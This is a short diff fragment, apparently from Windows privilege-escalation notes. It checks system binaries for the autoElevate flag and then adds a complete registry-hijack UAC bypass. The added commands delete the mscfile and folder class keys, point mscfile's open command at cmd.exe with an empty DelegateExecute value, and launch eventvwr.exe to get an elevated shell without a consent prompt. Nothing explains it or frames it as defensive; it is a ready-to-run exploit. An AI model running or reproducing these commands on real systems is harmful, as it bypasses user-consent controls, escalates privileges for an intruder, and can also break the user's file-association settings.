@@ -12,4 +12,13 @@ sigcheck -m C:\Windows\System32\sdclt.exe | findstr autoElevate
 sigcheck -m C:\Windows\System32\sysprep\sysprep.exe | findstr autoElevate
 sigcheck -m C:\Windows\System32\cliconfg.exe | findstr autoElevate
 
+REG DELETE "HKCU\Software\Classes\mscfile" /f
+REG DELETE "HKCU\Software\Classes\folder" /f
+
+REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "cmd.exe" /f
+REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
+
+REG QUERY "HKCU\Software\Classes\mscfile\Shell\Open\command"
+eventvwr.exe
+
 
